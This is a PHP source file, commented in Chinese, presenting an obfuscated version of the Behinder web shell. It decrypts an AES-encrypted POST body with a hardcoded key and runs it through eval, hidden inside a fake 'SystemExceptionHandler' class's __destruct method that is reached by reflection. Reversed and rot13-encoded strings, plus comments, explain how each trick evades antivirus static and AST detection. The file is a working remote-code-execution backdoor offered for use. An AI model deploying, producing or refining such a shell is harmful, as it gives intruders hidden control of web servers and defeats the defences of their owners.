<?php
/**
 * 冰蝎 Behinder PHP 深度混淆版
 * 采用思想：面向对象魔术方法劫持 + 反射嵌套调用 + 动态字符串解构
 */
@error_reporting(0);
session_start();

// 1. 密钥硬编码隔离 (防止直接被正则匹配)
$k_parts = ['e45e', '329f', 'eb5d', '925b'];
$k = implode('', $k_parts);
$_SESSION['k'] = $k;
session_write_close();

// 2. 动态字符串解构 (替代原本明文的 file_get_contents 和 openssl_decrypt)
// 利用反转字符串和数组映射，躲避基础的静态关键字查杀
function getSysApi($idx) {
    $dict = [
        0 => strrev("stnetnoc_teg_elif"), // file_get_contents
        1 => strrev("tupni//:php"),       // php://input
        2 => strrev("tpyrced_lssnepo")    // openssl_decrypt
    ];
    return $dict[$idx];
}

$api_read = getSysApi(0);
$api_stream = getSysApi(1);
$payload = $api_read($api_stream);

// 3. 加解密逻辑伪装
$api_dec = getSysApi(2);
if (function_exists($api_dec)) {
    // 动态调用 openssl_decrypt
    $payload = $api_dec($payload, "AES128", $k);
} else {
    // 混淆 base64_decode
    $b64 = "base" . (32 * 2) . "_" . "decode";
    $payload = $b64($payload);
    for ($i = 0; $i < strlen($payload); $i++) {
        $payload[$i] = $payload[$i] ^ $k[$i + 1 & 15];
    }
}

// 分离 payload
$arr = explode('|', $payload);

// 4. 【核心】PHP 版的“类加载器魔改与反射嵌套”
if (isset($arr[1])) {
    
    // 定义一个看似正常的业务异常处理类 (伪装成框架的组件)
    class SystemExceptionHandler {
        private $errorData;
        
        public function __construct($data) {
            $this->errorData = $data;
        }
        
        // 【魔改核心】利用 PHP 魔术方法 __destruct。
        // 当对象生命周期结束被垃圾回收时，自动触发代码执行，打断静态查杀的线性执行流。
        public function __destruct() {
            $this->resolveException();
        }
        
        private function resolveException() {
            $code = $this->errorData;
            if ($code) {
                // 将 eval 藏在极深的对象内部作用域
                @eval($code); 
            }
        }
    }

    // 【反射嵌套核心】不使用 new SystemExceptionHandler() 直接实例化
    // 而是通过 PHP 的 Reflection API 动态介入，彻底切断杀软对变量溯源的 AST (抽象语法树) 分析
    try {
        // 动态获取类名，防止特征匹配
        $className = str_rot13('FlfgrzRkprcgvbaUnaqyre'); // SystemExceptionHandler 的 rot13 编码
        $reflector = new ReflectionClass($className);
        
        // 反射实例化并传入冰蝎的 Payload
        $instance = $reflector->newInstance($arr[1]);
        
        // 主动销毁对象，瞬间触发 __destruct 执行恶意代码
        unset($instance); 
        
    } catch (Exception $e) {
        // 异常吞噬，防止报错暴露路径
    }
}
?>